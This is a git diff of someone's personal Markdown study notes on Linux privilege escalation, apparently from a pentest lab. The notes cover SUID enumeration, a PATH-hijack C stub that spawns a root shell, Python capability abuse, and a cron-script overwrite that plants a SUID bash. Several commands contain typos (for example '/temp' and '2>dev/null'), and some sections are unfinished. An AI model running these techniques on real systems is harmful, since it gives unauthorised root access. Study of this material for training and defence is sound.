@@ -69,7 +69,7 @@ Tools: [Kernal Exploits](https://github.com/lucyoa/kernel-exploits)
 ## Escalation via Weak File Permissions
 
 - weak file permission of shadow file (shadow file should not have read access)
-  
+
 ![alt text](image-8.png)
 
 - x is the placeholder for password (the password containe within the shadow file)
@@ -186,3 +186,116 @@ Exploit-DB for Simple CMS - https://www.exploit-db.com/exploits/46635
 - Exploit for CVE-2019-18634 - https://github.com/saleemrashid/sudo-cve-2019-18634
 
 ## Escalation Path SUID
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+![alt text](image-38.png)
+
+gtfobin
+
+![alt text](image-39.png)
+![alt text](image-40.png)
+![alt text](image-41.png)
+
+## Escalation via Shared Object Injection
+
+- similar to ld_preload
+- need to revise back
+
+## Escalation via Binary Symlink (Nginx Exploitation)
+
+- Nginx Exploit - https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+
+## Escalation via Enviromental Variable
+
+```bash
+env
+```
+
+![alt text](image-42.png)
+
+```bash
+find / -type f -perm -04000 -ls 2>dev/null
+```
+
+![alt text](image-43.png)
+
+- Create malicious service then which will be execute automatically
+
+```bash
+echo 'main(){ setgid(0); setuid(0); system("/bin/bash"); return 0;}' >/tmp/service.c
+
+gcc /tmp/service.c -o /tmp/service
+
+export PATH=/temp:$PATH
+print $PATH
+```
+
+## Escalation Capabilities
+
+- Hunting capabilities
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+![alt text](image-44.png)
+*get capability to run python as root
+
+- create exploit
+
+```bash
+usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+![alt text](image-46.png)
+*most important part kne ada ep (permit everything)
+
+![alt text](image-47.png)
+
+### Escalation via cronjobs
+
+- Command to get list of cron jobs
+
+```bash
+cat /etc/crontab
+```
+
+![alt text](image-48.png)
+* overwrite.sh run every one minute in machine
+
+## Escalation via Cron Paths
+
+1. Check list of cron jobs
+
+```bash
+cat /etc/crontab
+```
+
+![alt text](image-49.png)
+* cron job run overwrite.sh run every one minute in machine on path /home/user
+
+2. Check cronjob file
+
+```bash
+ls -la /home/user
+```
+
+![alt text](image-50.png)
+* overwrite.sh not exist (can be create with malicious content)
+
+3. Write cronjob file
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+```
+
+4. Wait for the file overwrite or run by the cronjob
+
+```bash
+ls -la /tmp
+/tmp/bash -p
+```
+
+![alt text](image-51.png)
